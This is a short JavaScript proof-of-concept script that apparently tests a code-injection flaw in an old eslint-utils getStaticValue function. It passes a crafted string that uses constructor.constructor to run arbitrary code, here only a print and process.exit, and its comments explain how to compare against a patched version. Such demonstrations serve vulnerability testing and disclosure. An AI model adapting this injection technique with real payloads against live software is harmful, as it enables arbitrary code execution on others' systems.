const eslint = require("eslint") // install eslint module
const utils = require("./eslint-utils/package/index") // point to vulnerable version of eslint-utils

// install of eslint should have its own version of eslint-utils 
// that doesn't have the vulnerability, if you want to test uncomment
// the next line and comment the previous definition of var utils
// const utils = require("eslint-utils")

var codeToInject = 'JSON.stringify({a:1}, new {}.constructor.constructor("console.log(\\"code injected\\"); process.exit(1)"), 2)'

var noScope = false
var actual = null

const linter = new eslint.Linter()

linter.defineRule("test", context => ({
    ExpressionStatement(node) {
        actual = utils.getStaticValue(
            node,
            noScope ? null : context.getScope()
            )
        },
    })
)

linter.verify(codeToInject, {
    env: { es6: true },
    parserOptions: { ecmaVersion: 2018 },
    rules: { test: "error" },
})

// if the vulnerability is in effect, this line will never be reached
console.log(JSON.stringify(actual))